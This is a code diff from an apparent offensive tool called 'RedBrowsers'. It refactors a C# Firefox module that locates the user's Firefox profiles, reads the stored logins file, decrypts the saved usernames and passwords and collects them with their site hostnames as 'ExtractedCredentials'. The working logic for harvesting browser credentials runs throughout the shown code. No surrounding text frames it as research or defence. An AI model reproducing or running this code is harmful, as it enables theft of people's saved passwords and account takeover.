@@ -2,23 +2,20 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using RedBrowsers.Classes;
-using RedBrowsers.ChromiumEngine;
+using RedBrowsers.Utlis;
 
-namespace RedBrowsers.Firfox
+namespace RedBrowsers.Firefox
 {
-    class FirefoxPassReader 
+    class FirefoxStorage 
     {
-
-        public static string BrowserName { get { return "Firefox"; } }
-        public static List<Account> ReadPasswords()
+        public static List<ExtractedCredentials> ReadPasswords()
         {
        
             string loginsFile = null;
             bool loginsFound = false;
             string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
-            var logins = new List<Account>();
+            var logins = new List<ExtractedCredentials>();
             if (dirs.Length == 0)
                 return logins;
 
@@ -52,12 +49,12 @@ namespace RedBrowsers.Firfox
                 {
                     string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                     string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
-                    logins.Add(new Account
+                    logins.Add(new ExtractedCredentials
                     {
                         UserName = username,
                         Password = password,
                         URL = loginData.hostname,
-                        Application = BrowserName
+                        Application = "Firefox"
 
                     });
                 }
